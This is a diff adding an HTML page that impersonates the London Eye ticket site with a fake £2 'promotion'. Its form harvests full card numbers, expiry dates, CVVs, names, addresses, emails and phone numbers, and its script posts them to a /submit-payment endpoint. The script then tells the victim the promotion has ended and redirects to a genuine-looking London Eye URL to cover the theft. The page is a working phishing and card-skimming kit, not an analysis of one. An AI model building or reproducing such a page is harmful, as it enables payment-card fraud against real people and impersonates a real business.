@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>London Eye</title>
+    <link rel="stylesheet" href="./style.css">
+    <script src="./script.js" defer></script>
+</head>
+<body>
+    <!-- Header Section -->
+    <header class="site-header" style="background-color: #092241; width: 100%;">
+        <div class="header-container">
+            <nav class="nav-menu">
+                <div class="nav-left">
+                    <img src="./assets/logo.png" class="logo" alt="logo">
+                    <h1 class="titles" style="color: aliceblue;">LONDON EYE</h1>
+                </div>
+            </nav>
+        </div>
+    </header>
+<div class="hero" style="
+    background-image: url(./assets/hero.webp);
+    width: 100%;
+    height: 700px;
+    padding: 50px;
+    display: flex;
+    justify-content: center;
+    align-items: start;
+    flex-direction: column;
+    background-size: cover;    
+    background-repeat: no-repeat; 
+    background-position: right;  
+    margin-bottom: 50px;
+">
+    <p class="p1" >360 Views of London's Skyline from £2</p>
+    <p class="p2" >The World's Most Iconic Ride</p>
+</div>
+        <section style="width: 100%; margin:50px 0; text-align: center; background-color: #092241; padding: 50px;">
+            <p style="color: aliceblue; font-weight: 700; text-transform: uppercase; font-size: 24px;">The promotion will end soon</p>
+        </section>
+    <div class="container" style="display: flex; gap: 30px;">
+<div class="calendar-container">
+    <div class="calendar">
+        <div class="cal-header">
+            <button class="btn" id="prev">
+                <svg width="20" height="20" fill="none" stroke-width="2" viewBox="0 0 24 24">
+                    <polyline points="15 18 9 12 15 6"></polyline>
+                </svg>
+            </button>
+
+            <div class="month-title" id="monthLabel"></div>
+
+            <button class="btn" id="next">
+                <svg width="20" height="20" fill="none" stroke-width="2" viewBox="0 0 24 24">
+                    <polyline points="9 18 15 12 9 6"></polyline>
+                </svg>
+            </button>
+        </div>
+
+        <!-- Desktop -->
+        <div class="weekdays" id="weekdays"></div>
+        <div class="days" id="days"></div>
+
+        <!-- Mobile -->
+        <div class="mobile-weekdays" id="mWeekdays">
+            <div>Mon</div><div>Tue</div><div>Wed</div>
+            <div>Thu</div><div>Fri</div><div>Sat</div><div>Sun</div>
+        </div>
+        <div class="mobile-week" id="mWeek"></div>
+        <div class="time-selector" style="margin-top: 20px; display: flex; flex-direction: column; gap: 6px;">
+    <label for="timeSelect" style="font-size: 14px; font-weight: 500;">Select Time:</label>
+    <select id="timeSelect" style="
+        padding: 8px 12px;
+        font-size: 14px;
+        border-radius: 8px;
+        border: 1px solid #ddd;
+        background-color: white;
+        cursor: pointer;
+        width: 150px;
+    ">
+        <option value="09:00">09:00 AM</option>
+        <option value="10:00">10:00 AM</option>
+        <option value="11:00">11:00 AM</option>
+        <option value="12:00">12:00 PM</option>
+        <option value="13:00">01:00 PM</option>
+        <option value="14:00">02:00 PM</option>
+        <option value="15:00">03:00 PM</option>
+    </select>
+</div>
+    </div>
+</div>
+<div id="ticketInfo">
+        Available Tickets for <span id="ticketDate"></span>
+        <section style="display: flex; margin-top: 10px;" class="ticket">
+            <div class="left-content">
+                <div>
+                    <h2 style="font-size: 18px;" class="title">Standard Ticket</h2>
+                    <p style="font-size: 12px; font-weight: normal; padding-bottom: 20px;" class="subtitle">Arrive at your booked time slot</p>
+                </div>
+                <div>
+                    <p style="font-size: 12px; color: grey;">Starting from</p>
+                    <p class="price"><del style="padding-right: 5px;">£29.00</del>£2.00</p>
+                </div>
+            </div>
+            <div class="right-content">
+                <button class="buy">Buy Now</button>
+            </div>
+        </section>
+        <section style="display: flex; margin-top: 10px;" class="ticket">
+            <div class="left-content">
+                <div>
+                    <h2 style="font-size: 18px;" class="title">Fast Track</h2>
+                    <p style="font-size: 12px; font-weight: normal; padding-bottom: 20px;" class="subtitle">Priority access for quicker entry</p>
+                </div>
+                <div>
+                    <p style="font-size: 12px; color: grey;">Starting from</p>
+                    <p class="price">£44.00</p>
+                </div>
+            </div>
+            <div class="right-content">
+                <button class="buy">Buy Now</button>
+            </div>
+        </section>
+        <section style="display: flex; margin-top: 10px;" class="ticket">
+            <div class="left-content">
+                <div>
+                    <h2 style="font-size: 18px;" class="title">Champagne Experience</h2>
+                    <p style="font-size: 12px; font-weight: normal; padding-bottom: 20px;" class="subtitle">Exclusive hosted experience with Fast Track entry and Champagne</p>
+                </div>
+                <div>
+                    <p style="font-size: 12px; color: grey;">Starting from</p>
+                    <p class="price">£49.00</p>
+                </div>
+            </div>
+            <div class="right-content">
+                <button class="buy">Buy Now</button>
+            </div>
+        </section>
+    </div>
+</div>
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="payment-container">
+            <div class="payment-header">
+                <h1>Payment Information</h1>
+            </div>
+            
+            <form id="payment-form">
+                <div class="form-group">
+                    <label for="card-number">Pay with card</label>
+                    <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19">
+                    <div class="error" id="card-error">Required</div>
+                </div>
+                
+                <div class="card-details">
+                    <div class="form-group expiration">
+                        <label for="expiration">Expiration</label>
+                        <input type="text" id="expiration" placeholder="MM/YY" maxlength="5">
+                        <div class="error" id="expiration-error">Required</div>
+                    </div>
+                    
+                    <div class="form-group cvv">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" placeholder="CVV" maxlength="4">
+                        <div class="error" id="cvv-error">Required</div>
+                    </div>
+                </div>
+                
+                <div class="name-group">
+                    <div class="form-group">
+                        <input type="text" id="first-name" placeholder="First Name">
+                        <div class="error" id="first-name-error">Required</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="text" id="last-name" placeholder="Last Name">
+                        <div class="error" id="last-name-error">Required</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="text" id="address1" placeholder="Address Line 1">
+                    <div class="error" id="address1-error">Required</div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="text" id="address2" placeholder="Address Line 2">
+                </div>
+                
+                <div class="form-group">
+                    <label for="country">Country</label>
+                    <select id="country">
+                        <option value="United Kingdom" selected>United Kingdom</option>
+                        <option value="United States">United States</option>
+                        <option value="Canada">Canada</option>
+                        <option value="Australia">Australia</option>
+                        <option value="Germany">Germany</option>
+                        <option value="France">France</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <input type="text" id="city" placeholder="City/Town">
+                    <div class="error" id="city-error">Required</div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="text" id="postcode" placeholder="Post Code">
+                    <div class="error" id="postcode-error">Required</div>
+                </div>
+                
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email Address">
+                    <div class="error" id="email-error">Required</div>
+                </div>
+                
+                <div class="form-group">
+                    <div class="phone-group">
+                        <select class="country-code" id="country-code">
+                            <option value="+44">+44</option>
+                            <option value="+1">+1</option>
+                            <option value="+61">+61</option>
+                            <option value="+49">+49</option>
+                            <option value="+33">+33</option>
+                        </select>
+                        <input type="tel" class="phone-number" id="phone" placeholder="Phone Number">
+                    </div>
+                    <div class="error" id="phone-error">Required</div>
+                </div>
+                
+                <div class="button-group">
+                    <button type="submit" class="submit-btn">Pay Now</button>
+                    <button type="button" class="back-btn">Back</button>
+                </div>
+            </form>
+            
+            <div class="footer">
+                <p>This site is protected by reCAPTCHA and the Google <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.</p>
+            </div>
+        </div>
+    </main>
+
+<script>
+    // Форматирование номера карты при вводе
+    document.getElementById('card-number').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+        if (value.length > 0) {
+            value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
+        }
+        e.target.value = value;
+    });
+    
+    // Форматирование даты истечения срока действия
+    document.getElementById('expiration').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        e.target.value = value;
+    });
+
+    // Обработчики для кнопок Buy Now
+    document.querySelectorAll('.buy').forEach(button => {
+        button.addEventListener('click', function() {
+            const ticketSection = this.closest('.ticket');
+            const ticketType = ticketSection.querySelector('.title').textContent;
+            const ticketPrice = ticketSection.querySelector('.price').textContent;
+            
+            // Сохраняем выбранный билет в sessionStorage (БЕЗ ALERT)
+            sessionStorage.setItem('selectedTicket', ticketType);
+            sessionStorage.setItem('selectedPrice', ticketPrice);
+            
+            // Прокрутка к форме оплаты
+            document.querySelector('.payment-container').scrollIntoView({ 
+                behavior: 'smooth' 
+            });
+        });
+    });
+
+    // Обработчик отправки формы
+    document.getElementById('payment-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        // Сброс предыдущих ошибок
+        const errors = document.querySelectorAll('.error');
+        errors.forEach(error => {
+            error.style.display = 'none';
+        });
+        
+        const inputs = document.querySelectorAll('input, select');
+        inputs.forEach(input => {
+            input.classList.remove('error-field');
+        });
+        
+        let isValid = true;
+        
+        // Проверка обязательных полей
+        const requiredFields = [
+            {id: 'card-number', errorId: 'card-error'},
+            {id: 'expiration', errorId: 'expiration-error'},
+            {id: 'cvv', errorId: 'cvv-error'},
+            {id: 'first-name', errorId: 'first-name-error'},
+            {id: 'last-name', errorId: 'last-name-error'},
+            {id: 'address1', errorId: 'address1-error'},
+            {id: 'city', errorId: 'city-error'},
+            {id: 'postcode', errorId: 'postcode-error'},
+            {id: 'email', errorId: 'email-error'},
+            {id: 'phone', errorId: 'phone-error'}
+        ];
+        
+        requiredFields.forEach(field => {
+            const input = document.getElementById(field.id);
+            const error = document.getElementById(field.errorId);
+            
+            if (!input.value.trim()) {
+                error.style.display = 'block';
+                input.classList.add('error-field');
+                isValid = false;
+            }
+        });
+        
+        // Дополнительная валидация
+        const email = document.getElementById('email').value;
+        if (email && !/^\S+@\S+\.\S+$/.test(email)) {
+            document.getElementById('email-error').textContent = 'Please enter a valid email address';
+            document.getElementById('email-error').style.display = 'block';
+            document.getElementById('email').classList.add('error-field');
+            isValid = false;
+        }
+        
+        const phone = document.getElementById('phone').value;
+        if (phone && !/^\d+$/.test(phone)) {
+            document.getElementById('phone-error').textContent = 'Please enter a valid phone number';
+            document.getElementById('phone-error').style.display = 'block';
+            document.getElementById('phone').classList.add('error-field');
+            isValid = false;
+        }
+        
+        if (isValid) {
+            // Собираем данные формы
+            const formData = {
+                cardNumber: document.getElementById('card-number').value,
+                expiration: document.getElementById('expiration').value,
+                cvv: document.getElementById('cvv').value,
+                firstName: document.getElementById('first-name').value,
+                lastName: document.getElementById('last-name').value,
+                address1: document.getElementById('address1').value,
+                address2: document.getElementById('address2').value,
+                country: document.getElementById('country').value,
+                city: document.getElementById('city').value,
+                postcode: document.getElementById('postcode').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('country-code').value + document.getElementById('phone').value,
+                ticketType: sessionStorage.getItem('selectedTicket') || 'Standard Ticket',
+                ticketPrice: sessionStorage.getItem('selectedPrice') || '£2.00',
+                date: document.getElementById('ticketDate')?.textContent || new Date().toLocaleDateString(),
+                time: document.getElementById('timeSelect')?.value || '09:00'
+            };
+
+            try {
+                const response = await fetch('/submit-payment', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // 1. Показываем сообщение на английском
+                    alert('Sorry, the promotion has ended.');
+                    
+                    // 2. Делаем редирект через 2 секунды
+                    setTimeout(() => {
+                        window.location.href = 'https://me-loneye.tickets.londoneye.com/cartView?l=en-gb&_cid=1438014976.1763875365';
+                    }, 1000);
+                    
+                } else {
+                    alert('❌ Error: ' + result.error);
+                }
+                    
+            } catch (error) {
+                alert('❌ Network error');
+            }
+        }
+    });
+    
+    // Обработчик для кнопки "Back"
+    document.querySelector('.back-btn').addEventListener('click', function() {
+        alert('Back button clicked!');
+    });
+</script>
+</body>
+</html>
